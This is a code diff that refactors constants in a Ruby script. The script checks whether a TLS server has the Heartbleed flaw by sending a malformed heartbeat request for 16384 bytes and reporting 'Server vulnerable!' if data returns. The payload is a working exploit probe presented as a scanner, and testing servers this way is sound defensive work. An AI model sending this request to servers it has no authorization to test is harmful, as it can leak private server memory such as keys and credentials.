@@ -2,7 +2,7 @@
 require 'socket'
 require 'timeout'
 
-HANDSHAKE = -> {
+CLIENT_HELLO = -> {
   data = <<-EOS
 16 03 01 00 38 01 00 00 34 03
 01 23 18 50 c0 c7 9d 32 9f 90
@@ -17,6 +17,13 @@ EOS
 
 PAYLOAD = "\x18\x03\x01\x00\x03\x01\x40\x00" #  0x4000 = 16384 = 2^14, max value to be returned
   
+SERVER_HELLO_DONE = "\x0e\x00\x00\x00"
+
+module ContentType
+  ALERT = "\x15"
+  HEARTBEAT = "\x18"
+end
+
 class TLSRecord
 
   attr_reader :type, :version, :value
@@ -42,7 +49,7 @@ end
 def read_until_server_hello_done(sock)
   loop do
     record = read_record(sock)
-    break if record.value == "\x0e\x00\x00\x00"
+    break if record.value == SERVER_HELLO_DONE
   end
 end
 
@@ -57,7 +64,7 @@ rescue Timeout::Error
   exit 1
 end
 
-sock.write(HANDSHAKE)
+sock.write(CLIENT_HELLO)
 
 begin
   read_until_server_hello_done(sock)
@@ -72,10 +79,10 @@ begin
   heartbeat = read_record(sock)
 
   case heartbeat.type
-  when "\x18"
+  when ContentType::HEARTBEAT
     raise "Server vulnerable!" if heartbeat.value
     puts "Server sent a heartbeat response, but no data. This is OK."
-  when "\x15"
+  when ContentType::ALERT
     puts "Server sent an alert instead of a heartbeat response. This is OK."
   else
     raise "Server sent an unexpected ContentType: #{heartbeat.type.inspect}"
